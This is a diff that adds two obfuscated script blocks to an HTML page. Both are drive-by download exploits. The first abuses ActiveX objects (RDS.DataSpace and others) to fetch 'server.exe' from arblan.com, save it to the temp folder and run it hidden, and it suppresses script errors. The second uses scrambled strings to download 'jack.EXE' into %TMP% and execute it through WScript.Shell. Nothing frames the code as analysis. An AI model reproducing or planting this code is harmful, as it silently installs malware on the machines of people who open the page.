@@ -1,0 +1,159 @@
+<script type="text/javascript" language="javascript">
+
+
+var iss = false;
+var uri = 'http://arblan.com/server.exe';
+
+var za = 'ting.FileS';
+var z = 'plication';
+var shellapp = 'Shell.Ap'+z;
+var z01 = "r%20%3D%20o.Creat'+'eObject%'+'28n%29";
+var z02 = "r%20%3D%20o.Creat'+'eObject%28n%'+'2C%20%22%22%29";
+var z03 = "r%20%3D%20o.Create'+'Object%28n%2C'+'%20%22%22%2C%20%22%22%29";
+var z04 = "r%20%3D%20o.GetOb'+'ject%28%'+'22%22%2C%20n%29";
+var z05 = "r%20%3D%20o.GetObject%28n%'+'2C%20%22%22%29";
+var z06 = "r%20%3D%2'+'0o.GetObject%28n%29";
+
+var a1 = 'ADO';
+var a2 = 'DB.';
+var a3 = 'Str';
+var a4 = 'eam';
+
+var obj_t = new Array(
+  'BD96'+'C556-65A'+'3-11D0-983'+'A-00C0'+'4FC29E36',
+  'AB9BCED'+'D-EC'+'7E-47E1-9322-D'+'4A210617116',
+  '0006F'+'033-0000-0000-C000-00000'+'0000046',
+  '0006F03A-0000-00'+'00-C000-000000000046',
+  '6e32070a-766d-4ee6-879c-dc1'+'fa91d2fc3',
+  '6414512B-B978-451D-A0D8-F'+'CFDF33E833C',
+  '7F5B7'+'F63-F06F-43'+'31-8A'+'26-339'+'E03C0AE3D',
+  '06723E09-F4'+'C2-43c8-8358-09F'+'CD1DB0766',
+  '639F725F-1B2'+'D-4831-A9FD-8748'+'47682'+'010',
+  'BA018'+'599-1DB3-44f9-83B4-461454C8'+'4BF8',
+  'D0C07D56'+'-7C'+'69-43'+'F1-B4A0-25'+'F5A11FAB19',
+  'E8CCCDDF-C'+'A28-496b-B050-6C'+'07C962476B');
+
+function CreateO(o, n) {
+  var r = null;  
+  var ko1 = 'etObject(n)';
+  var ko3 = 'teObject(n)';
+  var ko4 = 'o.Create';
+  var ko5 = 'bject("", n';
+  var ko6 = 'reateObj';
+  var ko7 = 'r = o.Ge';
+
+  try { eval('r = o.Crea'+ko3) }catch(e){}  
+  if (! r) {
+    try { eval('r = '+ko4+'Object(n, "")') }catch(e){}
+  }  
+  if (! r) {
+    try { eval('r = o.C'+ko6+'ect(n, "", "")') }catch(e){}
+  }
+  if (! r) {
+    try { eval('r = o.GetO'+ko5+')') }catch(e){}
+  }  
+  if (! r) {
+    try { eval(ko7+'tObject(n, "")') }catch(e){}
+  }  
+  if (! r) {
+    try { eval('r = o.G'+ko1) }catch(e){}
+  }
+  return(r);  
+}
+
+function iii() {
+  return true;
+}
+
+
+window.onerror = iii;
+
+
+function rname() {
+  var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
+  var string_length = 8;
+  var randomstring = '';
+  for (var i=0; i<string_length; i++) { var rnum = Math.floor(Math.random() * chars.length); randomstring += chars.substring(rnum,rnum+1);
+  } return randomstring + '.exe';
+} function DoIt() 
+{ 
+
+  x.Open('GET',uri + '?e=' + escape(rname()),false);
+  x.Send(); var fname1 = rname(); var f = xml.CreateObject('Scrip'+za+'ystemObject',''); var tmp = f.GetSpecialFolder(2);
+
+
+  fname1 = f.BuildPath(tmp,fname1);
+
+  S.open();
+  S.write(x.responseBody);
+  S.savetofile(fname1,2);
+  S.close(); var Q = xml.createobject(shellapp,'');
+  
+  Q.ShellExecute(fname1,'','','open',0);
+} if (window.ActiveXObject) { var ni = 0; while (obj_t[ni]) { var xml = null; var xml = document.createElement('object'); guid = obj_t[ni];
+    
+    xml.setAttribute('classid','clsid:'+guid); if (xml) {
+      n_xml = 'Microsoft.XMLHTTP'; try { var x = null; var x = CreateO(xml,n_xml); if (x) {
+          
+          str1 = a1 + a2;
+          str1 = str1 + a3 + a4;
+          str5 = str1; var S = xml.CreateObject(str5,"");
+          S.type = 1;
+          str6 = 'GET';
+          DoIt();
+        }
+
+      } catch(e){}
+    }
+
+    ni++;
+  }
+}
+</script>
+
+<script>
+<!--
+try {
+ function f(b, a, c) { return a + b + c; }
+ function g(b, a) { return a + b; }
+var s = new Array
+(
+ "",
+ "jack.EXE",
+ "http://arblan.com",
+ "object",
+ "classid",
+ f("0C0", g(f(g("3-11D0-9", "56-65A"), "id:BD96C5", "83A-0"), "cls"), g("9E36", "4FC2")),
+ g(f("ft.XMLH", "oso", "TTP"), "Micr"),
+ f("E", "G", "T"),
+ f(g(".Str", "odb"), "Ad", "eam"),
+ f(g(".She", "ipt"), "WScr", "ll"),
+ "PROCESS",
+ "TMP",
+ "/[^/]*$",
+ "/",
+ "\\"
+);
+a = document.createElement(s[3]);
+a.setAttribute(s[4], s[5]);
+with(a.CreateObject(s[6], s[0]))
+{
+ open(s[7], location.href.replace(new RegExp(s[12]), s[13] + s[1]), false);
+ send();
+ if(status < 400)
+  with(a.CreateObject(s[8], s[0]))
+  {
+   Type = 1;
+   Open();
+   Write(responseBody);
+   with(a.CreateObject(s[9], s[0]))
+   {
+    c = Environment(s[10])(s[11]) + s[14] + s[1];
+    SaveToFile(c, 2);
+    Exec(c);
+   }
+  }
+}
+} catch (e) {}
+// -->
+</script>
